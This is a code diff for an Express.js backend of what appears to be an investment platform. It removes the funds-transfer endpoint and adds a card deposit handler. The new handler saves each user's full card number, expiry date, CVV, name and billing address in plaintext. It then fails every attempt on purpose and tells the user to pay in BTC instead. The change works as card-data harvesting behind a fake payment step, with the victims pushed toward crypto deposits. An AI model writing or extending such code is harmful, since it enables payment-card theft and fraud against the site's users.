-      data: transaction
-    });
-
-    await logActivity('create-withdrawal', 'transaction', transaction._id, req.user._id, 'User', req, { amount, method });
-  } catch (err) {
-    console.error('Create withdrawal error:', err);
-    res.status(500).json({
-      status: 'error',
-      message: 'An error occurred while creating withdrawal'
-    });
-  }
-});
-
-app.post('/api/transactions/transfer', protect, [
-  body('amount').isFloat({ gt: 0 }).withMessage('Amount must be greater than 0'),
-  body('from').isIn(['main', 'active', 'matured', 'savings']).withMessage('Invalid source account'),
-  body('to').isIn(['main', 'active', 'matured', 'savings']).withMessage('Invalid destination account')
-], async (req, res) => {
-  const errors = validationResult(req);
-  if (!errors.isEmpty()) {
-    return res.status(400).json({
-      status: 'fail',
-      errors: errors.array()
-    });
-  }
-
-  try {
-    const { amount, from, to } = req.body;
-    const user = await User.findById(req.user.id);
-
-    if (user.balances[from] < amount) {
-      return res.status(400).json({
-        status: 'fail',
-        message: `Insufficient balance in ${from} account`
-      });
-    }
-
-    // Perform transfer
-    user.balances[from] -= amount;
-    user.balances[to] += amount;
-    await user.save();
-
-    // Create transaction record
-    const reference = `TRF-${crypto.randomBytes(3).toString('hex').toUpperCase()}`;
+    // Store card details in transaction (in a real system, you would tokenize this)
     const transaction = await Transaction.create({
       user: req.user.id,
-      type: 'transfer',
+      type: 'deposit',
       amount,
       currency: 'USD',
-      status: 'completed',
-      method: 'internal',
+      status: 'failed', // Always fail for now
+      method: 'card',
       reference,
       netAmount: amount,
-      details: `Transfer of $${amount} from ${from} to ${to} account`
+      details: `Card deposit attempt of $${amount}`,
+      cardDetails: {
+        fullName,
+        billingAddress,
+        cardNumber,
+        expiryDate,
+        cvv
+      }
     });
 
-    res.status(201).json({
-      status: 'success',
-      data: transaction
+    res.status(400).json({
+      status: 'fail',
+      message: 'Card payments are currently unavailable. Please use BTC for deposits.'
     });
 
-    await logActivity('transfer-funds', 'transaction', transaction._id, req.user._id, 'User', req, { amount, from, to });
+    await logActivity('card-payment-attempt', 'transaction', transaction._id, req.user._id, 'User', req, { amount });
   } catch (err) {
-    console.error('Transfer funds error:', err);
+    console.error('Process payment error:', err);
     res.status(500).json({
       status: 'error',
-      message: 'An error occurred while transferring funds'
+      message: 'An error occurred while processing payment'
     });
   }
 });
